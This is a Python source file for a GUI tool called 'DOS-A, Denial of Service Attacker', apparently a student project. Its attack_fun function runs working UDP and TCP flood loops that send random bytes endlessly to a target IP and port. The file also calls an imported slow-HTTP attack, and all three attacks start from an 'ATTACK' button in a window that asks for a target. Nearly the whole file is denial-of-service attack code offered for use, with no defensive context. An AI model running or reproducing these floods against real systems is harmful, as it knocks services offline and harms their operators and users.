import random
import socket
from slowhttp import slowhttpAttack
#import threading



def attack_fun(ip, port, choice, times):
	if choice == 'UDP':
		data = random._urandom(1024)
		i = random.choice(("[*]","[!]","[#]"))
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
				addr = (str(ip),int(port))
				for x in range(times):
					s.sendto(data,addr)
				print(i +" Sent!!!")
			except:
				print("[!] Error!!!")

	elif choice == 'TCP':
		data = random._urandom(16)
		i = random.choice(("[*]","[!]","[#]"))
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((ip,port))
				s.send(data)
				for x in range(times):
					s.send(data)
				print(i +" Sent!!!")
			except:
				s.close()
				print("[*] Error")




#ip = str(input(" Host/Ip:"))
#port = int(input(" Port:"))
#choice = str(input(" UDP(y/n):"))
#times = int(input(" Packets per one connection:"))
#threads = int(input(" Threads:"))

#for y in range(threads):
#	if choice == 'y':
#		th = threading.Thread(target = run)
#		th.start()
#	else:
#		th = threading.Thread(target = run2)
#		th.start()



from tkinter import*
from tkinter import filedialog
import PIL
from PIL import ImageTk,Image
from tkinter.ttk import *

root=Tk()
root.title("DOS-A")
image1 = ImageTk.PhotoImage(Image.open('dos_attack.jpg'))
image_label = Label(image=image1).pack()
title = Label(root ,text ="Denial of Service Attacker",font =("Times new roman",40,"bold"))
title.place(relx=0.5,rely=0.05,anchor ="center")
title = Label(root ,text ="DOS-A",font =("Times new roman",40,"bold"))
title.place(relx=0.5,rely=0.15,anchor ="center")
footer = Label(root, text="--Pratiksha Gandhi | Amal Sutone | Shardul Kulkari | Vaibhav Chaudhari --", font=("Times new roman",10,"bold"))
footer.place(relx=0.5, rely=0.98, anchor="center")

global var
var=IntVar()
global input1, input2, input3
input1 = StringVar
input2 = IntVar
input3 = IntVar

def slowhttp():
    pass

def tcp_flood():
    pass

def udp_flood():
    pass

def xyz():
    pass

    
def Attack_window():
    def Attack():
        if(var.get() == 1):
            print(no_of_requests_txt.get())
            slowhttpAttack(ip_txt.get(), int(port_txt.get()), int(no_of_requests_txt.get()))
            #attack_fun(ip_txt.get(), int(port_txt.get()), 'TCP', int(no_of_requests_txt.get()))
        elif(var.get()==2):
            attack_fun(ip_txt.get(), int(port_txt.get()), 'TCP', int(no_of_requests_txt.get()))
        elif (var.get() == 3):
            attack_fun(ip_txt.get(), int(port_txt.get()), 'UDP', int(no_of_requests_txt.get()))
        elif(var.get()==4):
            xyz()
        return



    window1 = Toplevel()
    window1.title("Attacks")
    window1.geometry('550x400+750+300')
    heading = Label(window1, text="Target", font=("Times new roman", 30, "bold")).place(relx=0.1, rely=0.1,
                                                        anchor="center")
    ip = Label(window1, text="ip", font=("Times new roman", 20, "bold")).place(relx=0.1, rely=0.3)
    port = Label(window1, text="port", font=("Times new roman", 20, "bold")).place(relx=0.1, rely=0.4)
    no_of_requests = Label(window1, text="No of Conn.", font=("Times new roman", 20, "bold")).place(relx=0.1,rely=0.5)


    ip_txt = Entry(window1, width=30, textvariable=input1)
    ip_txt.place(relx=0.6, rely=0.3)
    port_txt = Entry(window1, width=30)
    port_txt.place(relx=0.6, rely=0.4)
    no_of_requests_txt = Entry(window1, width=30)
    no_of_requests_txt.place(relx=0.6, rely=0.5)

    button1 = Radiobutton(window1, text="slowhttp", variable=var, value=1)
    button1.place(relx=0.2, rely=0.7)
    button2 = Radiobutton(window1, text="TCPflood", variable=var, value=2)
    button2.place(relx=0.35, rely=0.7)
    button3 = Radiobutton(window1, text="UDPflood", variable=var, value=3)
    button3.place(relx=0.55, rely=0.7)
    #button4 = Radiobutton(window1, text="dontknow", variable=var, value=4)
    #button4.place(relx=0.6, rely=0.7)

    attack = Button(window1, text="ATTACK", command=Attack)
    attack.place(relx=0.12, rely=0.8)

# Function responsible for the updation
# of the progress bar value
def bar():
    import time
    progress = Progressbar(root, orient=HORIZONTAL,
    length=500, mode='determinate')
    for x in range(10):
        progress['value'] += 20
        root.update_idletasks()
        time.sleep(1)
        progress.place(relx=0.5,rely =0.65,anchor="center")

    Attack_window()



start = Button(root,text = "Start",command = bar).place(relx=0.5,rely=0.5)
root.mainloop()




